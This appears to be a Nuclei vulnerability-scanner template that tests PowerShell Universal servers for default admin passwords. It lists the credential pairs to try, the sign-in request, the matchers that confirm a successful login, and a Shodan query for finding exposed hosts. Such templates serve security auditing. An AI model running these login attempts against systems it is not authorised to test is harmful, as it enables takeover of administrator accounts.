id: powershell-default-login

info:
  name: PowerShell Universal - Default Login
  author: ap3r
  severity: high
  description: |
    PowerShell Universal default admin credentials were discovered.
  reference:
    - https://ironmansoftware.com/powershell-universal
  metadata:
    verified: true
    max-request: 3
    shodan-query: "html:\"PowerShell Universal\""
  tags: default-login,powershell-universal,vuln

http:
  - raw:
      - |
        POST /api/v1/signin HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}"}

    attack: clusterbomb
    payloads:
      username:
        - admin
      password:
        - admin
        - password
        - powershell

    host-redirects: true
    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: header
        words:
          - 'Set-Cookie'

      - type: word
        part: body
        words:
          - '{"returnUrl":"/admin"}'

      - type: word
        part: body
        words:
          - '{"errorMessage":"Bad username or password"}'
        negative: true
